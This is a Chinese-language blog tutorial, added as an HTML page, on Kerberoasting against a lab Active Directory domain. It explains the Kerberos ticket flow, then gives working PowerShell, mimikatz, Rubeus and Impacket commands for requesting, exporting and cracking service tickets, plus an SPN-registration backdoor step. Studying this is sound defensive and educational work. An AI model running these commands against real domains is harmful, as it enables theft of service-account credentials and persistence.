@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>域渗透-Kerberoasting - F0rmat的博客-专注于网络安全、信息安全、内网渗透、红队攻防</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="F0rmat" />
+  <meta name="description" content="0x00 前言 Kerberoasting 是域渗透中经常使用的一项技术，是Tim Medin 在 DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin 同时发布了配套的攻击工具 kerberoast。此后" />
+
+  <meta name="keywords" content="渗透测试, 网络安全, F0rmat" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.91.2" />
+
+
+<link rel="canonical" href="https://xxe.icu/post/ad_kerberoasting/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.5227954e5327390ee2be2e9ddae8b96f1ada64bdf87e87b56b029198ec14dcde.css" integrity="sha256-UieVTlMnOQ7ivi6d2ui5bxraZL34foe1awKRmOwU3N4=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="域渗透-Kerberoasting" />
+<meta property="og:description" content="0x00 前言 Kerberoasting 是域渗透中经常使用的一项技术，是Tim Medin 在 DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin 同时发布了配套的攻击工具 kerberoast。此后" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xxe.icu/post/ad_kerberoasting/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-02-26T11:04:34+08:00" />
+<meta property="article:modified_time" content="2022-02-26T11:04:34+08:00" />
+
+<meta itemprop="name" content="域渗透-Kerberoasting">
+<meta itemprop="description" content="0x00 前言 Kerberoasting 是域渗透中经常使用的一项技术，是Tim Medin 在 DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin 同时发布了配套的攻击工具 kerberoast。此后"><meta itemprop="datePublished" content="2022-02-26T11:04:34+08:00" />
+<meta itemprop="dateModified" content="2022-02-26T11:04:34+08:00" />
+<meta itemprop="wordCount" content="3671">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="域渗透-Kerberoasting"/>
+<meta name="twitter:description" content="0x00 前言 Kerberoasting 是域渗透中经常使用的一项技术，是Tim Medin 在 DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin 同时发布了配套的攻击工具 kerberoast。此后"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">F0rmat's Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/categories/">目录</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      F0rmat's Blog
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/categories/">目录</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">域渗透-Kerberoasting</h1>
+      
+      <div class="post-meta">
+        <time datetime="2022-02-26" class="post-time">
+          2022-02-26
+        </time>
+        <div class="post-category">
+            <a href="https://xxe.icu/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/"> 域渗透 </a>
+            
+          </div>
+        <span class="more-meta"> 约 3671 字 </span>
+          <span class="more-meta"> 预计阅读 8 分钟 </span>
+
+        
+        
+          <span id="busuanzi_container_page_pv">
+            | 阅读 <span id="busuanzi_value_page_pv"></span>
+          </span>
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-基础概念">0x01 基础概念</a>
+      <ul>
+        <li><a href="#kerberos认证">kerberos认证</a>
+          <ul>
+            <li><a href="#tgs_req">TGS_REQ</a></li>
+            <li><a href="#tgs_rep">TGS_REP</a></li>
+          </ul>
+        </li>
+        <li><a href="#spn介绍">SPN介绍</a></li>
+        <li><a href="#攻击原理">攻击原理</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-实战">0x02 实战</a>
+      <ul>
+        <li><a href="#环境">环境</a></li>
+        <li><a href="#方法一ps脚本">方法一（PS脚本）</a></li>
+        <li><a href="#方法二mimikatz">方法二（mimikatz）</a></li>
+        <li><a href="#方法三rubeus">方法三（Rubeus）</a></li>
+        <li><a href="#方法四impacket">方法四（Impacket）</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-攻击扩展">0x03 攻击扩展</a></li>
+    <li><a href="#0x04-参考">0x04 参考</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      <h1 id="0x00-前言">0x00 前言</h1>
+<p>Kerberoasting 是域渗透中经常使用的一项技术，是Tim Medin 在 DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin 同时发布了配套的攻击工具 kerberoast。此后，不少研究人员对 Kerberoasting 进行了改进和扩展，在 GitHub 上开发发布了大量工具，使得 Kerberoasting 逐渐发展成为域攻击的常用方法之一。</p>
+<p>Kerberoast攻击是在TGS_REP的过程中用户将会收到由目标服务实例的NTLM hash加密生成的ST(service ticket)，加密算法为RC4-HMAC，如果获得这个ST票据，我们可以尝试穷举口令，模拟加密过程，进行破解。</p>
+<blockquote>
+<p>Kerberoasting和Kerberoast是同一种技术，叫法不一样</p>
+</blockquote>
+<h1 id="0x01-基础概念">0x01 基础概念</h1>
+<p>在之前的一遍kerberos认证中有介绍过TGS认证的详细过程，大家可以先去阅览一番：<a href="https://xxe.icu/posts/kerberos_authentication/">域渗透-Kerberos认证</a></p>
+<p>我们先知道下面一些名称的用途：</p>
+<ul>
+<li>KDC（Key Distribution Center）= 密钥分发中心</li>
+<li>AS（Authentication Service）= 认证用户的身份，并为其发放TGT的服务</li>
+<li>TGT（Ticket Granting Ticket）= TGT认证票据，由AS服务发放</li>
+<li>TGS（Ticket Granting Service）= 票据发放服务</li>
+<li>ST（Service Tickets）= ST服务票据，由TGS服务发送</li>
+<li>AP（Application Server）= 提供用户所需的服务</li>
+</ul>
+<h2 id="kerberos认证">kerberos认证</h2>
+<p>攻击发送在TGS认证的阶段，首先我们要知道这个攻击只要在域用户的权限下都可以发送TGS请求。</p>
+<h3 id="tgs_req">TGS_REQ</h3>
+<ol>
+<li>经过AS_REP的步骤，客户端获得了 TGT票据 和 Login Session Key。</li>
+<li>用自己的密码NTLM Hash解密Login Session Key得到原始的Logon Session Key。</li>
+<li>它会在本地缓存此 TGT票据和 原始的Login Session Key。如果现在它需要访问某台服务器的某个服务，它就需要凭借这张TGT票据向KDC申请相应的ST服务票据（Service Ticket）。</li>
+<li>ST服务票据是通过KDC的 TGS服务颁发的。</li>
+</ol>
+<h3 id="tgs_rep">TGS_REP</h3>
+<ol>
+<li>
+<p>TGS接收到请求之后，首先会检查自身是否存在客户端所请求的服务（就是查询SPN）。</p>
+</li>
+<li>
+<p>如果服务存在，则通过 krbtgt 用户的NTLM Hash 解密TGT并得到Login Session Key，然后通过Login Session Key解密Authenticator。</p>
+</li>
+<li>
+<p>如果解密成功，则验证了对方的真实身份，同时还会验证时间戳是否在范围内。并且还会检查TGT中的时间戳是否过期，且原始地址是否和TGT中保存的地址相同。</p>
+</li>
+<li>
+<p>在完成上述的检测后，如果验证通过，则TGS完成了对客户端的认证，会生成一个用Logon Session Key加密后的用于确保客户端-服务器之间通信安全的Service Session Key会话秘钥(也就是最外层enc-part部分)，并且会为该客户端生成ST服务票据。</p>
+<p>ST服务票据主要包含两方面的内容：客户端用户信息和原始Service Session Key，整个ST服务票据用该服务的NTLM Hash进行加密。</p>
+</li>
+<li>
+<p>最终Service Session Key 和 ST服务票据 发送给客户端。(这一步不管用户有没有访问服务的权限，只要TGT正确，就都会返回ST服务票据，这也是kerberoasting能利用的原因，任何一个用户，只要hash正确，就可以请求域内任何一个服务的ST票据)</p>
+</li>
+</ol>
+<h2 id="spn介绍">SPN介绍</h2>
+<p>服务主体名称（SPN：ServicePrincipal Names）是服务实例（可以理解为一个服务，比如 HTTP、MSSQL）的唯一标识符。Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册 SPN。</p>
+<p>当某用户需要访问MySQL服务时，系统会以当前用户的身份向域控查询SPN为MySQL的记录。当找到该SPN记录后，用户会再次与KDC通信，将KDC发放的TGT作为身份凭据发送给客户，并将需要访问的SPN发送给KDC。</p>
+<p>KDC中的TGS服务对TGT进行解密。确认无误后，由TGS将一张允许访问该SPN所对应的服务的ST服务票据和该SPN所对应的服务的地址发送给用户，用户使用该票据即可访问MySQL服务。</p>
+<p>相关详细的文章可以查看另外一遍文章<a href="https://xxe.icu/posts/ad_spn/">域渗透-SPN</a></p>
+<h2 id="攻击原理">攻击原理</h2>
+<ol>
+<li>攻击者对一个域进行身份验证，然后从域控制器获得一个TGT认购权证，该TGT认购权证用于以后的ST服务票据请求。</li>
+<li>攻击者使用他们的 TGT认购权证 发出ST服务票据请求(TGS-REQ) 获取特定标识的SPN。此SPN在域中应该是唯一的，并且在用户或计算机帐户的servicePrincipalName 字段中注册。在服务票证请求(TGS-REQ)过程中，攻击者可以指定它们支持的Kerberos加密类型(RC4_HMAC，AES256_CTS_HMAC_SHA1_96等等)。</li>
+<li>如果攻击者的 TGT 是有效的，则 DC 将从TGT认购权证中提取信息并填充到ST服务票据中。然后，域控制器查找哪个帐户在ServicedPrincipalName 字段中注册了所请求的 SPN。ST服务票据使用注册了所要求的 SPN 的帐户的NTLM哈希进行加密,并使用攻击者和服务帐户共同商定的加密算法。ST服务票据以服务票据回复(TGS-REP)的形式发送回攻击者。</li>
+<li>攻击者从 TGS-REP 中提取加密的服务票证。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。</li>
+</ol>
+<h1 id="0x02-实战">0x02 实战</h1>
+<p>利用步骤：</p>
+<ol>
+<li>查询SPN，找到有价值的SPN，需要满足以下条件：
+<ul>
+<li>该SPN注册在域用户帐户(Users)下</li>
+<li>域用户账户的权限很高</li>
+</ul>
+</li>
+<li>请求TGS</li>
+<li>导出TGS</li>
+<li>暴力破解</li>
+</ol>
+<h2 id="环境">环境</h2>
+<table>
+<thead>
+<tr>
+<th>主机名称</th>
+<th style="text-align:left">IP地址</th>
+<th>所在域</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DC</td>
+<td style="text-align:left">172.16.0.106</td>
+<td>hack.lab</td>
+<td>提供SPN服务和kerberos认证</td>
+</tr>
+<tr>
+<td>SQL</td>
+<td style="text-align:left">172.16.0.111</td>
+<td>hack.lab</td>
+<td>提供SQL Server服务</td>
+</tr>
+<tr>
+<td>WIN7A</td>
+<td style="text-align:left">172.16.0.105</td>
+<td>hack.lab</td>
+<td>攻击者拿到的权限主机</td>
+</tr>
+<tr>
+<td>Kali Linux</td>
+<td style="text-align:left">172.16.0.107</td>
+<td></td>
+<td>攻击者</td>
+</tr>
+</tbody>
+</table>
+<h2 id="方法一ps脚本">方法一（PS脚本）</h2>
+<p>首先是在主机WIN7A上面的普通域用户进行操作，使用powershell进行操作，下面是请求SPN中所有的TGS：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
+<span class="n">setspn</span><span class="p">.</span><span class="n">exe</span> <span class="n">-q</span> <span class="p">*/*</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s1">&#39;^CN&#39;</span> <span class="n">-Context</span> <span class="n">0</span><span class="p">,</span><span class="n">1</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Context</span><span class="p">.</span><span class="n">PostContext</span><span class="p">[</span><span class="n">0</span><span class="p">].</span><span class="n">Trim</span><span class="p">()</span> <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/1.png" alt="1"></p>
+<p>如果想请求单个服务可以用下面的命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
+<span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;MSSQLSvc/SQL.hack.lab:1433&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Kerberos 协议中请求的票据会保存在内存中，可以通过 <code>klist</code> 命令查看当前会话存储的 kerberos 票据:</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/2.png" alt="2"></p>
+<p>接着我们使用RiskySPN工具包中的<a href="https://github.com/cyberark/RiskySPN/blob/master/Get-TGSCipher.ps1">Get-TGSCipher.ps1</a>脚本来进行导出：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Get-TGSCipher</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Get-TGSCipher</span> <span class="n">-SPN</span> <span class="s2">&#34;MSSQLSvc/SQL.hack.lab:1433&#34;</span> <span class="n">-Format</span> <span class="n">Hashcat</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>如果想要用John，改成-Format John即可</p>
+</blockquote>
+<p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/6.png" alt="6"></p>
+<p>然后把这串字符放到hashcat进行破解就完事了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hashcat -m <span class="m">13100</span> hash.txt passwd.txt
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/7.png" alt="7"></p>
+<p>因为要做mimikatz的免杀，我们可以使用powershell的脚本，这是来自于Empire框架中的<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">Invoke-Kerberoast.ps1</a>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-kerberoast</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Invoke-kerberoast</span> <span class="n">-OutputFormat</span> <span class="n">Hashcat</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>结果如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/9.png" alt="9"></p>
+<p>同上放到hashcat破解即可。</p>
+<h2 id="方法二mimikatz">方法二（mimikatz）</h2>
+<p>除了可以使用powershell脚本，也可以使用大杀器mimikatz。</p>
+<p>首先还是先请求spn，把所有服务的TGS都存储到内存中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
+<span class="n">setspn</span><span class="p">.</span><span class="n">exe</span> <span class="n">-q</span> <span class="p">*/*</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s1">&#39;^CN&#39;</span> <span class="n">-Context</span> <span class="n">0</span><span class="p">,</span><span class="n">1</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Context</span><span class="p">.</span><span class="n">PostContext</span><span class="p">[</span><span class="n">0</span><span class="p">].</span><span class="n">Trim</span><span class="p">()</span> <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>接着可使用mimikatz导出票据(不需要系统权限)：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">kerberos::list /export
+</code></pre></td></tr></table>
+</div>
+</div><p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/3.png" alt="3"></p>
+<p>接着把票据拿到<a href="https://github.com/nidem/kerberoast">kerberoast</a>工具包中的<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">tgsrepcrack.py</a>破解：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 tgsrepcrack.py  passwordlist.txt 2-40a50000-lucky@MSSQLSvc<span class="se">\~</span>SQL.hack.lab<span class="se">\~</span>1433-HACK.LAB.kirbi
+</code></pre></td></tr></table>
+</div>
+</div><p>结果如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/4.png" alt="4"></p>
+<p>也可以把票据转换成John的格式进行破解：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 kirbi2john.py 2-40a50000-lucky@MSSQLSvc<span class="se">\~</span>SQL.hack.lab<span class="se">\~</span>1433-HACK.LAB.kirbi &gt; kirbihash
+john --wordlist passwordlist.txt kirbihash
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="方法三rubeus">方法三（Rubeus）</h2>
+<p>这款工具我们有在另外一篇<a href="https://xxe.icu/posts/ad_as_reproasting/#rubeus">域渗透-AS_REPRoasting</a>讲过，当然它也可以用来做Kerberoasting攻击。</p>
+<p>直接运行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">./</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="err">:</span><span class="n">hash</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>会输出hashcat的破解格式文本：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/8.png" alt="8"></p>
+<p>还是用hashcat破解：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hashcat -m <span class="m">13100</span> hash.txt passwd.txt
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="方法四impacket">方法四（Impacket）</h2>
+<p>使用 <strong><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></strong> 工具包中的 模块<code>GetUSerSPNs.py</code>可以进行远程攻击，需要获取到域用户的密码或者是NTLM。</p>
+<p>命令如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">GetUserSPNs.py hack.lab/lucky:p@ssw0rd -dc-ip 172.16.0.106 -request
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>-dc-ip 后面接的是DC的IP，-request是输出结果。</p>
+<p>使用NTLM可以使用参数-hashes，使用aeseky可以使用参数-aesKey</p>
+<p>-outputfile可以输出为文件</p>
+</blockquote>
+<p>结果如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/10.png" alt="10"></p>
+<p>把内容拿到hashcat爆破即可。</p>
+<p>如果遇到下面的报错问题：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+</code></pre></td></tr></table>
+</div>
+</div><p>原因是没有同步dc上面的时间，可以使用下面的命令进行同步：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo apt install ntpdate
+sudo ntpdate 172.16.0.106
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="0x03-攻击扩展">0x03 攻击扩展</h1>
+<p>先说防范Kerberoast攻击最有效的方法是：确保服务账号密码的长度超过25位。</p>
+<p>在真实环境中我们应该怎么去利用这个方法进行攻击呢，假如我们拿到的服务账户密码很强破解不了或者是说我们怎么去利用这个攻击作为一种后门呢？</p>
+<p>做后门的办法：</p>
+<ol>
+<li>
+<p>为普通域用户赋予<code>Read servicePrincipalName</code>和<code>Write serverPrincipalName</code>权限</p>
+</li>
+<li>
+<p>我们可以使用下面的命令去把域用户注册在SPN的服务中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">setspn -S MSSQLSvc/SQL.hack.lab:1433 administrator
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>然后我们就可以利用上面的方法进行破解了</p>
+</li>
+<li>
+<p>删除SPN</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">setspn -D MSSQLSvc/SQL.hack.lab:1433 administrator
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<p>但还是有局限性的，因为密码难度也决定了我们攻击的效率。</p>
+<p>其实也可以对AES进行破解，但是破解的速度会比rc4慢很多：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hashcat -m <span class="m">19700</span> hash_aes256.txt passwd.txt
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>在进行日志审计时可以重点关注ID为4679(请求Kerberos服务票据)的时间。如果有过多的 4769 日志应进一步检查系统中是否存在恶意行为。</p>
+</blockquote>
+<h1 id="0x04-参考">0x04 参考</h1>
+<p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting</a></p>
+<p><a href="https://www.cnblogs.com/zpchcbd/p/11707776.html">https://www.cnblogs.com/zpchcbd/p/11707776.html</a></p>
+<p><a href="https://chowdera.com/2021/12/20211201194023144R.html">https://chowdera.com/2021/12/20211201194023144R.html</a></p>
+<p><a href="https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/">https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/</a></p>
+<p><a href="https://blog.harmj0y.net/redteaming/kerberoasting-revisited/">https://blog.harmj0y.net/redteaming/kerberoasting-revisited/</a></p>
